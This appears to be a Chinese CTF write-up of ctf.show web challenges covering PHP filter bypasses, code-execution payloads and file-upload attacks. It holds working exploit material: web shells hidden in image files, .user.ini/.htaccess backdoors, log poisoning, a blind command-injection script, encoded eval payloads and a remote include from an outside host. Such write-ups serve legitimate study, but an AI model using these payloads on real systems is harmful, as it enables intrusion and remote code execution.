    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

```
http://48be80d0-d7b0-4424-ab6b-eeff1d1adcba.challenge.ctf.show/?file=compress.zlib://flag.php
```

方法二：
在linux中/proc/self/root是指向根目录的，也就是如果在命令行中输入ls /proc/self/root，其实显示的内容是根目录下的内容。多次重复后绕过is_file。大佬的解释是:超过20次软连接后就可以绕过is_file
这里使用的是PHP最新版的小Trick，require_once包含的软链接层数较多时once 的 hash 匹配会直接失效造成重复包含(目录溢出)
[Require_once绕过不能重复包含文件的限制](https://www.anquanke.com/post/id/213235?from=timeline)

```
payload:?file=/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/p
roc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/pro
c/self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/
self/root/proc/self/root/proc/self/root/proc/self/root/proc/self/root/proc/se
lf/root/proc/self/root/var/www/html/flag.php
```

##### web114

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
function filter($file){
    if(preg_match('/compress|root|zip|convert|\.\.\/|http|https|data|data|rot13|base64|string/i',$file)){
        die('hacker!');
    }else{
        return $file;
    }
}
$file=$_GET['file'];
echo "师傅们居然tql都是非预期 哼！";
if(! is_file($file)){
    highlight_file(filter($file));
}else{
    echo "hacker!";
}
```

没过滤filter，直接`http://eddaa24b-05d9-4a3b-93e0-7364f835f1c0.challenge.ctf.show/?file=php://filter/resource=flag.php`

##### web115

```php
<?php
include('flag.php');
highlight_file(__FILE__);
error_reporting(0);
function filter($num){
    $num=str_replace("0x","1",$num);
    $num=str_replace("0","1",$num);
    $num=str_replace(".","1",$num);
    $num=str_replace("e","1",$num);
    $num=str_replace("+","1",$num);
    return $num;
}
$num=$_GET['num'];
if(is_numeric($num) and $num!=='36' and trim($num)!=='36' and filter($num)=='36'){ 
    #is_numeric() 检测变量是否为数字或数字字符串 is_numeric($num)要求num识别为数字，但num不能强等于"36"
    #trim($num)!=='36'要求不能强等于”36“,然后filter之后要弱等于36
    if($num=='36'){ #$num=='36'但最后要求弱等于"36"
        echo $flag;
    }else{
        echo "hacker!!";
    }
}else{
    echo "hacker!!!";
} hacker!!!
```

trim() 去除字符串首尾处的空白字符（或者其他字符）、如果不指定第二个参数，trim() 将去除这些字符：
" " (ASCII 32 (0x20))，普通空格符。
"\t" (ASCII 9 (0x09))，制表符。
"\n" (ASCII 10 (0x0A))，换行符。
"\r" (ASCII 13 (0x0D))，回车符。
"\0" (ASCII 0 (0x00))，空字节符。（空字符）  %0c也相当于空字符
"\x0B" (ASCII 11 (0x0B))，垂直制表符
chr() 返回ascii 所对应的单个字符
此函数与 [ord()](https://www.php.net/manual/zh/function.ord.php) 是互补的。ord() 转换字符串第一个字节为 0-255 之间的值[chr() ](https://www.php.net/manual/zh/function.chr.php)

如何绕过is_numeric()和trim()? Fuzz测试一下 测试is_numeric

```php
<?php
for ($i=0; $i <128 ; $i++) {
	$x=chr($i).'36';
	if(is_numeric($x)===true){
		echo urlencode(chr($i))."\n";
	}
}
//输出%09 %0A %0B %0C %0D + %2B - . 0 1 2 3 4 5 6 7 8 9
```

测试trim和numeric

```php
<?php
for($i=0;$i<=128;$i++) {
	$x=chr($i).'36';
	if(trim($x)!=='36' &&is_numeric($x)){
		echo urlencode(chr($i))."\n";
	}
}
 
//输出结果%0C %2B - . 0 1 2 3 4 5 6 7 8 9
```

除去被过滤的+ - .  只剩下%0c ，也就是换页符\f 对于绕过，如果不知道怎么绕过就拿ASCII码把所有字符跑一遍

```
payload:?num=%0c36
```

##### web123

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?/", $c)&&$c<=18){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

第一个难搞的地方isset($_POST['CTF_SHOW.COM'])因为php变量命名（字母数字下划线）是不允许使用点号的 
测试可以发现点被下划线替代了

GET或POST方式传进去的**变量名**,会**自动**将空格 + . [转换为_
但是有一个特性可以绕过,使变量名出现.之类的：特殊字符 [
GET或POST方式传参时,变量名中的[会被替换为_,但其后的字符就不会被替换了。
[利用PHP的字符串解析特性Bypass](https://www.freebuf.com/articles/web/213359.html)

```php
<?php
var_dump($_POST);
//输入xxx[xx[xx.xx xx%2bxx=2 输出 array(1) { ["xxx_xx[xx.xx xx+xx"]=> string(1) "2" }
```

[extract](https://www.php.net/extract) 从数组中将变量导入到当前的符号表 [PHP extract() 函数 | 菜鸟教程](https://www.runoob.com/php/func-array-extract.html)

```
POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=extract($_POST)&fl0g=flag_give_me
POST:CTF_SHOW=1&CTF[SHOW.COM=1&fun=echo $flag
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=var_dump($GLOBALS)   //题目出不来，本地测试可以
```

##### web125

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print/i", $c)&&$c<=16){
         eval("$c".";");
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
?>
```

```
URL：http://4b201820-6156-463a-b124-3a90d8b65596.challenge.ctf.show/?1=flag.php
POST：CTF_SHOW=&CTF[SHOW.COM=&fun=highlight_file($_GET[1])
```

##### web126

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
$a=$_SERVER['argv'];
$c=$_POST['fun'];
if(isset($_POST['CTF_SHOW'])&&isset($_POST['CTF_SHOW.COM'])&&!isset($_GET['fl0g'])){
    if(!preg_match("/\\\\|\/|\~|\`|\!|\@|\#|\%|\^|\*|\-|\+|\=|\{|\}|\"|\'|\,|\.|\;|\?|flag|GLOBALS|echo|var_dump|print|g|i|f|c|o|d/i", $c) && strlen($c)<=16){
         eval("$c".";");  
         if($fl0g==="flag_give_me"){
             echo $flag;
         }
    }
}
```

```php
GET:?a=1+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
or
GET:?$fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=assert($a[0])
or
GET:?a=+fl0g=flag_give_me
POST:CTF_SHOW=&CTF[SHOW.COM=&fun=parse_str($a[1])
//+表示空格，用来分割不同参数
```

##### web127

```php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);
$ctf_show = md5($flag);
$url = $_SERVER['QUERY_STRING'];

function waf($url){
    if(preg_match('/\`|\~|\!|\@|\#|\^|\*|\(|\)|\\$|\_|\-|\+|\{|\;|\:|\[|\]|\}|\'|\"|\<|\,|\>|\.|\\\|\//', $url)){
        return true;
    }else{
        return false;
    }
}

if(waf($url)){
    die("嗯哼？");
}else{
    extract($_GET);
}


if($ctf_show==='ilove36d'){
    echo $flag;
} 
```

```php
?ctf show=ilove36d #php在解析$_SERVER['QUERY_STRING']时，它会做两件事：删除空白符   将某些字符转换为下划线（包括空格）
```

##### web128

```php
<?php
error_reporting(0);
include("flag.php");
highlight_file(__FILE__);

$f1 = $_GET['f1'];
$f2 = $_GET['f2'];

if(check($f1)){
    var_dump(call_user_func(call_user_func($f1,$f2)));
}else{
    echo "嗯哼？";
}

function check($str){
    return !preg_match('/[0-9]|[a-z]/i', $str);
} NULL
```

```
 _()是一个函数 	
_()==gettext() 是gettext()的拓展函数，开启text扩展。需要php扩展目录下有php_gettext.dll
get_defined_vars()函数
get_defined_vars — 返回由所有已定义变量所组成的数组 这样可以获得 $flag
payload: ?f1=_&f2=get_defined_vars
```

##### web129

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['f'])){
    $f = $_GET['f'];
    if(stripos($f, 'ctfshow')>0){
        #stripos() 函数查找字符串在另一字符串中第一次出现的位置（不区分大小写）
        echo readfile($f);
    }
}
```

```sh
http://41eb01b4-b0d2-40b1-a485-3fb5897c2c7a.challenge.ctf.show/?f=/ctfshow/../../../../var/www/html/flag.php
?f=ctfshow/../flag.php
?f=php://filter/read=convert.base64-encode|ctfshow/resource=flag.php
#filter伪协议支持多种编码方式，无效的就被忽略掉了
```

##### web130

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = $_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f, 'ctfshow') === FALSE){
        die('bye!!');
    }
    echo $flag;
}
```

```php
POST:f=ctfshow #直接就可以绕过
```

##### web131

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
include("flag.php");
if(isset($_POST['f'])){
    $f = (String)$_POST['f'];

    if(preg_match('/.+?ctfshow/is', $f)){
        die('bye!');
    }
    if(stripos($f,'36Dctfshow') === FALSE){
        die('bye!!');
    }

    echo $flag;

}
```

正则表达式是溢出 https://www.laruence.com/2010/06/08/1579.html  
在php中正则表达式进行匹配有一定的长度限制，超过限制直接返回false

```python
import requests
url='http://c8c120c5-b605-48d9-9d4c-06b3d18143e5.challenge.ctf.show/'
data={
	'f':'very'*250000+'36Dctfshow'
}
r=requests.post(url,data=data)
print(r.text)
```

##### web132

 php中&&和||运算符应用 访问/robots.txt,之后访问/admin，获得源代码 

```php
<?php
#error_reporting(0);
include("flag.php");
highlight_file(__FILE__);


if(isset($_GET['username']) && isset($_GET['password']) && isset($_GET['code'])){
    $username = (String)$_GET['username'];
    $password = (String)$_GET['password'];
    $code = (String)$_GET['code'];

    if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin"){
        
        if($code == 'admin'){
            echo $flag;
        }
    }
}
```

https://www.cnblogs.com/hurry-up/p/10220082.html 
对于“与”（&&） 运算： x && y 当x为false时，直接跳过，不执行y； 
对于“或”（||） 运算 ： x||y 当x为true时，直接跳过，不执行y。 

```
payload: ?a=admin&b=admin&c=admin
```

#在判断这个的时候
if($code === mt_rand(1,0x36D) && $password === $flag || $username ==="admin")
第一个$code === mt_rand(1,0x36D)为false,之后就执行|| $username ==="admin"#成功绕过

##### web133

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|netcat/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("6个字母都还不够呀?!");
    }
}#看不明白博客 先放着
```

##### web134

```php
<?php
highlight_file(__FILE__);
$key1 = 0;
$key2 = 0;
if(isset($_GET['key1']) || isset($_GET['key2']) || isset($_POST['key1']) || isset($_POST['key2'])) {
    die("nonononono");
}
@parse_str($_SERVER['QUERY_STRING']);
extract($_POST);
if($key1 == '36d' && $key2 == '36d') {
    die(file_get_contents('flag.php'));
}
```

php变量覆盖 利用点是 extract($\_POST); 进行解析$\_POST数组。 先将GET方法请求的解析成变量，然后在利用extract() 函数从数组中将变量导入到当前的符号表。

```php
http://5b37d41f-792b-4680-860e-7c8a3732c4ee.challenge.ctf.show/?_POST[key1]=36d&_POST[key2]=36d
```

##### web135

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
//flag.php
if($F = @$_GET['F']){
    if(!preg_match('/system|nc|wget|exec|passthru|bash|sh|netcat|curl|cat|grep|tac|more|od|sort|tail|less|base64|rev|cut|od|strings|tailf|head/i', $F)){
        eval(substr($F,0,6));
    }else{
        die("师傅们居然破解了前面的，那就来一个加强版吧");
    }
}
```

```
?F=`$F` ;cp flag.php 2.txt;
?F=`$F` ;uniq flag.php>4.txt;
```

```
url/2.txt
url/4.txt
```

##### web136

```php
<?php
error_reporting(0);
function check($x){
    if(preg_match('/\\$|\.|\!|\@|\#|\%|\^|\&|\*|\?|\{|\}|\>|\<|nc|wget|exec|bash|sh|netcat|grep|base64|rev|curl|wget|gcc|php|python|pingtouch|mv|mkdir|cp/i', $x)){
        die('too young too simple sometimes naive!');
    }
}
if(isset($_GET['c'])){
    $c=$_GET['c'];
    check($c);
    exec($c);
}
else{
    highlight_file(__FILE__);
}
?>
```

```
#先留着...
```

##### web137

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}
call_user_func($_POST['ctfshow']);
#call_user_func — 把第一个参数作为回调函数调用
```

```
POST:ctfshow=ctfshow::getFlag
```

php中 ->与:: 调用类中的成员的区别 ->用于动态语境处理某个类的某个实例 ::可以调用一个静态的、不依赖于其他初始化的类方法.

##### web138

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){ #在上一题的基础上过滤了冒号
    die("private function"); #call_user_func中不但可以传字符串也可以传数组
}	#这时候会调用 classname中的 say_hello方法

call_user_func($_POST['ctfshow']);
```

```
POST:ctfshow[0]=ctfshow&ctfshow[1]=getFlag
```

##### web139

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
class ctfshow
{
    function __wakeup(){
        die("private class");
    }
    static function getFlag(){
        echo file_get_contents("flag.php");
    }
}

if(strripos($_POST['ctfshow'], ":")>-1){
    die("private function");
}

call_user_func($_POST['ctfshow']);
```

```python
import requests
import time
import string
str=string.ascii_letters+string.digits
result=""
for i in range(1,5):
	key=0
	for j in range(1,15):
		if key==1:
			break
		for n in str:
			payload="if [ `ls /|awk 'NR=={0}'|cut -c {1}` == {2} ];then sleep 3;fi".format(i,j,n)
			#print(payload)
			url="http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="+payload
			try:
				requests.get(url,timeout=(2.5,2.5))
			except:
			    result=result+n
			    print(result)
			    break
			if n=='9':
				key=1
	result+=" " #跑根目录
```

```python
import requests
import time
import string
str=string.digits+string.ascii_lowercase+"-"
result=""
key=0
for j in range(1,45):
	print(j)
	if key==1:
		break
	for n in str:
		payload="if [ `cat /f149_15_h3r3|cut -c {0}` == {1} ];then sleep 3;fi".format(j,n)
		#print(payload)
		url="http://877848b4-f5ed-4ec1-bfc1-6f44bf292662.chall.ctf.show?c="+payload
		try:
			requests.get(url,timeout=(2.5,2.5))
		except:
		    result=result+n
		    print(result)
		    break
```

##### web140

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_POST['f1']) && isset($_POST['f2'])){
    $f1 = (String)$_POST['f1'];
    $f2 = (String)$_POST['f2'];
    if(preg_match('/^[a-z0-9]+$/', $f1)){
        if(preg_match('/^[a-z0-9]+$/', $f2)){
            $code = eval("return $f1($f2());");
            if(intval($code) == 'ctfshow'){
                echo file_get_contents("flag.php");
            }
        }
    }
}
```

可以看到只要让intval($code)为0就可以了，intval会将非数字字符转换为0，也就是说 
`intval('a')==0 intval('.')==0 intval('/')==0`，所以方法就挺多了

```
md5(phpinfo())
md5(sleep())
md5(md5())
current(localeconv)
sha1(getcwd())     因为/var/www/html md5后开头的数字所以我们改用sha1
f1=usleep&f2=usleep
```

##### web141

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];

    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/^\W+$/', $v3)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

异或脚本 https://blog.csdn.net/miuzzx/article/details/109143413

```php
<?php
highlight_file(__FILE__);
$a = $_GET['a'];
for ($i = 0; $i < strlen($a); $i++) {
    echo "%".dechex(ord($a[$i])^0xff);
}
echo "^";
for ($i = 0; $i < strlen($a); $i++) {
    echo "%ff";
}
```

```
?v1=1&v2=1&v3=%2b(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)%2b`
```

##### web142

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
if(isset($_GET['v1'])){
    $v1 = (String)$_GET['v1'];
    if(is_numeric($v1)){
        $d = (int)($v1 * 0x36d * 0x36d * 0x36d * 0x36d * 0x36d);
        sleep($d);
        echo file_get_contents("flag.php");
    }
}
```

```
http://662f49d5-487d-4452-b901-7953ce219332.challenge.ctf.show/?v1=0
http://662f49d5-487d-4452-b901-7953ce219332.challenge.ctf.show/?v1=0x0
0和0x0绕过 这里绕过因为是因为当成了8进制和16进制
```

##### web143

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\+|\-|\.|\_|\||\$|\{|\}|\~|\%|\&|\;/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

除了 + - 我们还可以用 * / 去和数字运算,异或没有被过滤

```
http://d4413724-b13d-492b-a5ba-74dcc5923f47.challenge.ctf.show/?v1=1&v2=1&v3=*(%8c%86%8c%8b%9a%92^%ff%ff%ff%ff%ff%ff)(%8b%9e%9c%df%99%d5^%ff%ff%ff%ff%ff%ff)*
```

##### web144

```php
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
 
    if(is_numeric($v1) && check($v3)){
        if(preg_match('/^\W+$/', $v2)){
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
 
function check($str){
    return strlen($str)===1?true:false;
```

相比上两道题，这里只判断了is_numeric($v1)和check($v3).

```shell
http://8a6058a0-8691-4506-bc0d-05ee21bfec5f.challenge.ctf.show/?v1=1&v3=-&v2=(~%8C%86%8C%8B%9A%92)(~%9C%9E%8B%DF%99%93%9E%98%D1%8F%97%8F); #完了查看源码即可
```

##### web145

```php
<?php
highlight_file(__FILE__);
if(isset($_GET['v1']) && isset($_GET['v2']) && isset($_GET['v3'])){
    $v1 = (String)$_GET['v1'];
    $v2 = (String)$_GET['v2'];
    $v3 = (String)$_GET['v3'];
    if(is_numeric($v1) && is_numeric($v2)){
        if(preg_match('/[a-z]|[0-9]|\@|\!|\+|\-|\.|\_|\$|\}|\%|\&|\;|\<|\>|\*|\/|\^|\#|\"/i', $v3)){
                die('get out hacker!');
        }
        else{
            $code =  eval("return $v1$v3$v2;");
            echo "$v1$v3$v2 = ".$code;
        }
    }
}
```

```php
<?php
//在命令行中运行

/*author yu22x*/

fwrite(STDOUT,'[+]your function: ');

$system=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

fwrite(STDOUT,'[+]your command: ');

$command=str_replace(array("\r\n", "\r", "\n"), "", fgets(STDIN)); 

echo '[*] (~'.urlencode(~$system).')(~'.urlencode(~$command).');';

```

```bash
http://56bd5b74-26b3-4856-b1e0-b0ef20100b07.challenge.ctf.show/?v1=%0a1&v2=%0a0&v3=?(~%8c%86%8c%8b%9a%92)(~%9c%9e%8b%df%99%d5):
```

```
?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
?v1=1&v2=1&v3=?(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5):
```

##### web146

```
?v1=1&v2=1&v3=|(~%8C%86%8C%8B%9A%92)(~%8B%9E%9C%DF%99%D5)|
```

##### web147

```php
<?php
highlight_file(__FILE__);

if(isset($_POST['ctf'])){
    $ctfshow = $_POST['ctf'];
    if(!preg_match('/^[a-z0-9_]*$/isD',$ctfshow)) {
        $ctfshow('',$_GET['show']);
    }

}
```

利用create_function函数

```
http://80486914-43f3-4683-b8da-b61be2db34ef.challenge.ctf.show/?show=;};system('grep flag flag.php');/*
POST:ctf=\create_function
```

```
GET：?show=}system('tac flag.php');//
POST：ctf=\create_function
```

##### web148

没有过滤异或，直接异或

```
http://f9f8e6da-78d9-4749-99c6-863b94b3825b.challenge.ctf.show/?code=("%08%02%08%09%05%0d"^"%7b%7b%7b%7d%60%60")("%09%01%03%01%06%02"^"%7d%60%60%21%60%28");
```

##### web149

```php
<?php
error_reporting(0);
highlight_file(__FILE__);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}

file_put_contents($_GET['ctf'], $_POST['show']);

$files = scandir('./'); 
foreach($files as $file) {
    if(is_file($file)){
        if ($file !== "index.php") {
            unlink($file);
        }
    }
}
```

```
暂时放着...
```

##### web150

暂时放着...

#### 文件上传

##### 总结

```ini
.user.ini  不仅仅用于apache服务器，但要求上传目录下有一个php文件 
.htaccess   只适用于apache服务器，没有文件的要求，可指定解析任意文件
```

```htaccess
<FilesMatch "shell">
SetHandler application/x-httpd-php
</FilesMatch>
```

```htaccess
AddType application/x-httpd-php [fileType]
```

```ini
auto_prepend_file=[file/path]
```

##### web151

Hack.png图片马，上传后绕过前端判断文件格式，BurpSuite抓包后修改文件为php文件，即`Hack.php`

```shell
cat .\web151.png
<?php @eval($_POST["shell"]); ?>
```

上传完成后得到图片路径：`upload/Hack.php`，蚁剑连接即可

```
URL地址：http://dbfabc9f-54d1-448c-9424-f336055618bc.challenge.ctf.show/upload/Hack.php
连接密码：shell
```

![image-20230426171853205](.\Web-CTF\CTFshow036.png)

##### web152

BP抓包修改`Content-Type: image/png`头完成绕过

##### web153

后端不接收php文件，可以上传配置文件进行操作。
php.ini是php的一个全局配置文件，对整个web服务起作用；而.user.ini和.htaccess一样是目录的配置文件，.user.ini就是用户自定义的一个php.ini，我们可以利用这个文件来构造后门和隐藏后门。 但是这种方式其实是有个前提的，因为.user.ini只对他同一目录下的文件起作用，也就是说，只有他同目录下有php文件才可以。

配置文件内容：

```ini
auto_prepend_file=filename      //包含在文件头
auto_append_file=filename       //包含在文件尾
//filename是你自己的文件名
```

为了利用auto_append_file，我们首先上传.user.ini内容为 auto_append_file=“xxx” xxx为我们上传的文件名，接着上传一个带木马的图片
因为upload有index.php，所以这个php就会添加一个include(“shell.png”)，就会包含到木马,这样就在每个php文件上包含了我们的木马文件。
这两个设置的区别只是在于auto_prepend_file是在文件前插入；auto_append_file在文件最后插入（当文件调用的有exit()时该设置无效）

文件内容：

.user.ini.png

```ini
GIF89a
auto_prepend_file="Hack.png"
```

Hack.png 

```php
GIF89a
<?php @eval($_POST['shell']);?>
```

```
URL地址：http://48b75ea1-8990-4c80-9a05-877739bd14de.challenge.ctf.show/upload/
连接密码：shell
```

##### web154

过滤了php，使用php短标签进行绕过。做法同155

```htaccess
GIF89a
auto_prepend_file="Hack.png"
```

```php
GIF89a
<?=@eval($_POST['shell']);?>
```

```
URL地址：http://4732d262-d92f-408a-824f-5fb94bdaa7e2.challenge.ctf.show/upload/
连接密码：shell
```

##### web156

木马文件中过滤了`[]`符号，可以使用`{}`

```ini
GIF89a
auto_prepend_file="Hack.png"
```

```php
GIF89a
<?=@eval($_POST{"shell"});?>
```

```
URL地址：http://37deab79-7996-4807-b888-1df537370c6d.challenge.ctf.show/upload/
连接密码：shell
```

##### web157

过滤了`:`和`{}`，结合命令执行，构造图片木马：

```php
<?=(system("nl ../f*.*p"))?> #查看源代码即可
```

```
view-source:http://b7efa649-6099-4e8c-b6b7-dba4d512f450.challenge.ctf.show/upload/
```

##### web158

同上一题，可以尝试其他命令

```php
<?=(system("nl ../f*.*p"))?>
```

##### web159

可能过滤了一些函数，用" ` "包住即可

```php
GIF89a
<?=`nl ../f*.*p`?>
```

##### web160

过滤了括号和反引号，所以不好上传指令，所以用.user.ini 包含图片，日志文件上传

```php
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

```
------WebKitFormBoundaryIGjrdLD4173cXq51
Content-Disposition: form-data; name="file"; filename="shell.png"
Content-Type: image/png

<?=include"/var/lo"."g/nginx/access.lo"."g"?>
------WebKitFormBoundaryIGjrdLD4173cXq51--
```

然后直接访问`url/upload/`即可看到日志信息，再次访问用HackBar添加User-Agent的php-eval即可拿下。

![image-20230426213606190](.\Web-CTF\CTFshow037.png)

##### web161

```php
GIF89a
<?=include"/var/lo"."g/nginx/access.lo"."g"?>
```

本题过滤了命令执行，可以使用反引号绕过直接读取flag

```ini
User-Agent: <?=`tac ../f*` ?>
```

![image-20230427103457547](.\Web-CTF\CTFshow038.png)

访问`url/upload/`，`Ctfl+F`直接搜索`{`拿到`flag`

##### web162

预期解是`session包含`，但是网站没做并发，没条件做，下面的方法没做出来，先放着
使用远程文件包含，过滤了小数点`.`，`.user.ini`配置文件不要写后缀

```ini
GIF89a
auto_prepend_file=shell
```

取反脚本：

```php
$a = "data://text/plain,<?php system('tac ../f*');?>";
echo "~(";
for ($i = 0; $i < strlen($a); $i++) {
    echo "%".bin2hex(~$a[$i]);
}
echo ")";
//%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%d8%8b%9e%9c%df%d1%d1%d0%99%d5%d8%d6%c4%c0%c1
```

shell:

```php
GIF89a
<?=require~%9b%9e%8b%9e%c5%d0%d0%8b%9a%87%8b%d0%8f%93%9e%96%91%d3%c3%c0%8f%97%8f%df%8c%86%8c%8b%9a%92%d7%d8%8b%9e%9c%df%d1%d1%d0%99%d5%d8%d6%c4%c0%c1?>
```

解法二，正常上传配置文件，上传远程链接，该链接打开后查看源码为一句话木马，将该链接发送过去直接蚁剑。但是目前该网站无法访问，所以还是没做的了

```php
GIF89a
<?=include'http://1363569045/'>
```

##### web163

预期解是`session包含`，但是网站没做并发，没条件做，先放着

##### web164

png图片二次渲染绕过

```php
<?php
$p = array(0xa3, 0x9f, 0x67, 0xf7, 0x0e, 0x93, 0x1b, 0x23,
           0xbe, 0x2c, 0x8a, 0xd0, 0x80, 0xf9, 0xe1, 0xae,
           0x22, 0xf6, 0xd9, 0x43, 0x5d, 0xfb, 0xae, 0xcc,
           0x5a, 0x01, 0xdc, 0x5a, 0x01, 0xdc, 0xa3, 0x9f,
           0x67, 0xa5, 0xbe, 0x5f, 0x76, 0x74, 0x5a, 0x4c,
           0xa1, 0x3f, 0x7a, 0xbf, 0x30, 0x6b, 0x88, 0x2d,
           0x60, 0x65, 0x7d, 0x52, 0x9d, 0xad, 0x88, 0xa1,
           0x66, 0x44, 0x50, 0x33);



$img = imagecreatetruecolor(32, 32);

for ($y = 0; $y < sizeof($p); $y += 3) {
   $r = $p[$y];
   $g = $p[$y+1];
   $b = $p[$y+2];
   $color = imagecolorallocate($img, $r, $g, $b);
   imagesetpixel($img, round($y / 3), 0, $color);
}

imagepng($img,'1.png'); #保存在本地的图片马
?>
```

```php
<?=eval($_PSOT{"shell"});?> #把这个木马随便插入图片中 然后放在同一级目录下运行脚本变成如下内容
```

```hex
�PNG


IHDR ���      pHYs���+IDATH�c\<?=$_GET[0]($_POST[1]);?>X����s^7�����~_�}�'���ɿ_�|�00cٹg��=2��Q0
F�(�`��Q0

  ��

IEND�B`�
```

![image-20230427165147651](.\Web-CTF\CTFshow039.png)

```
http://394cdcf0-e5f7-4b2b-8b2e-39c2742dfe9f.challenge.ctf.show/download.php?image=adf82ecf43cd21ebcaf2f5c388d5213b.png &0=system
POST：1=tac+flag.php
```

我用这个方法并没有做出该题

##### web165

二次渲染，国外大佬的脚本：

```php
<?php
    /*

    The algorithm of injecting the payload into the JPG image, which will keep unchanged after transformations caused by PHP functions imagecopyresized() and imagecopyresampled().
    It is necessary that the size and quality of the initial image are the same as those of the processed image.

    1) Upload an arbitrary image via secured files upload script
    2) Save the processed image and launch:
    jpg_payload.php <jpg_name.jpg>

    In case of successful injection you will get a specially crafted image, which should be uploaded again.

    Since the most straightforward injection method is used, the following problems can occur:
    1) After the second processing the injected data may become partially corrupted.
    2) The jpg_payload.php script outputs "Something's wrong".
    If this happens, try to change the payload (e.g. add some symbols at the beginning) or try another initial image.

    Sergey Bobrov @Black2Fan.

    See also:
    https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/

    */
		
    $miniPayload = "<?=eval(\$_POST[7]);?>"; //注意$转义


    if(!extension_loaded('gd') || !function_exists('imagecreatefromjpeg')) {
        die('php-gd is not installed');
    }

    if(!isset($argv[1])) {
        die('php jpg_payload.php <jpg_name.jpg>');
    }

    set_error_handler("custom_error_handler");

    for($pad = 0; $pad < 1024; $pad++) {
        $nullbytePayloadSize = $pad;
        $dis = new DataInputStream($argv[1]);
        $outStream = file_get_contents($argv[1]);
        $extraBytes = 0;
        $correctImage = TRUE;

        if($dis->readShort() != 0xFFD8) {
            die('Incorrect SOI marker');
        }

        while((!$dis->eof()) && ($dis->readByte() == 0xFF)) {
            $marker = $dis->readByte();
            $size = $dis->readShort() - 2;
            $dis->skip($size);
            if($marker === 0xDA) {
                $startPos = $dis->seek();
                $outStreamTmp = 
                    substr($outStream, 0, $startPos) . 
                    $miniPayload . 
                    str_repeat("\0",$nullbytePayloadSize) . 
                    substr($outStream, $startPos);
